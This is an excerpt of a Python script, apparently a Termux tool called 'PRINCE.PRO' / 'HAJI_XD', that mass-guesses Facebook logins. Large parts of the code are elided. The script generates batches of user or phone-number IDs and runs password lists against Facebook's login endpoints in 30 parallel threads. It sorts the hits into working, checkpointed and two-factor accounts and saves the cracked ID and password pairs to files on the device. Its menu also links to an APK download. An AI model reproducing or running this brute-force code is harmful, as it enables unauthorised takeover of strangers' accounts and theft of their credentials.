...
----------------------------------------------
 Author    :HAJI NAJEEB
 Github    : HAJI_NAJEEB
 Facebook  : PRINCE_HAJI
 Tool Name : PRINCE.PRO
 Tool type : FREE
----------------------------------------------
 For Haters: XHT4 D4 KH0R Y4R MR _NAJEEB
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/rashood.khan.16');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/HAJI_XD_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/rashood.khan.16');menu()
                        elif xd in ['0','00']:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as HAJI_XD:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                HAJI_XD.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HAJI_XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        HAJI_XD=session.cookies.get_dict().keys()
                        if "c_user" in HAJI_XD:
                                print('\r\r\033[1;32m [HAJI_XD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HAJI_XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HAJI_XD:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HAJI_XD-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI_XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [HAJI_XD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI_XD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[HAJI_XD-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [HAJI_XD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI_XD-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [HAJI_XD-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI_XD-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
